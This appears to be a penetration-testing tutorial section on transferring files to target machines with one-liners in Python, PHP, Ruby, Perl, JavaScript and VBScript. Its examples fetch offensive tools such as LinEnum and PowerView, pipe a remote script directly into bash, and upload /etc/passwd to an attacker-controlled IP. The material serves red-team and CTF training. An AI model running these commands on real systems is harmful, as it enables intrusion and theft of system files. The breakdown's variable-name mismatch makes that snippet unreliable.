# Transferring Files with Code

When targeting machines, we often find different programming languages installed. Commonly encountered languages include Python, PHP, Perl, and Ruby, especially on Linux distributions. These languages can also be installed on Windows, though less frequently. Additionally, Windows default applications like `cscript` and `mshta` allow execution of JavaScript or VBScript code, which can also be used on Linux hosts.

With approximately 700 programming languages available, we can create code in many of them to download, upload, or execute instructions on an OS. This section provides examples using some common programming languages.

## Python

Python is widely used, with version 3 currently supported. However, older servers may still use Python 2.7. Python allows running one-liners from the command line using the `-c` option.

### Python 2 - Download

```
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### Python 3 - Download

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

---

## PHP

PHP is prevalent, powering 77.4% of websites with a known server-side language. It provides several methods for file transfer and supports running one-liners using the `-r` option.

### PHP Download with File_get_contents()

```
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

### PHP Download with Fopen()

```
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

### PHP Download and Pipe to Bash

```
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

---

## Ruby

Ruby supports one-liners using the `-e` option for file transfers.

### Ruby - Download a File

```
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

---

## Perl

Perl is another popular language for file transfers, supporting one-liners with the `-e` option.

### Perl - Download a File

```
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

---

## JavaScript

JavaScript can be used for file downloads. Below is an example using Windows `cscript` to execute JavaScript.

### JavaScript Code: `wget.js`

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Execute JavaScript Code

```
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

---

## VBScript

VBScript is an Active Scripting language installed by default on Windows since Windows 98.

### VBScript Code: `wget.vbs`

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Execute VBScript Code

```
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

---

## Upload Operations using Python 3

Python’s `requests` module can perform HTTP file uploads. Below is an example.

### Start the Python Upload Server

```
python3 -m uploadserver
```

### Upload a File

```
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### Breakdown of the Python Code

```
import requests

# Define the target URL
URL = "http://192.168.49.128:8000/upload"

# Open the file to upload
file = open("/etc/passwd","rb")

# Perform the upload
r = requests.post(url,files={"files":file})
```

---

## Section Recap

Understanding file transfer techniques using code can aid in red teaming, penetration testing, CTF competitions, incident response, forensic investigations, or sysadmin tasks. These examples demonstrate downloading and uploading files using various programming languages, showcasing the versatility and importance of coding in these scenarios.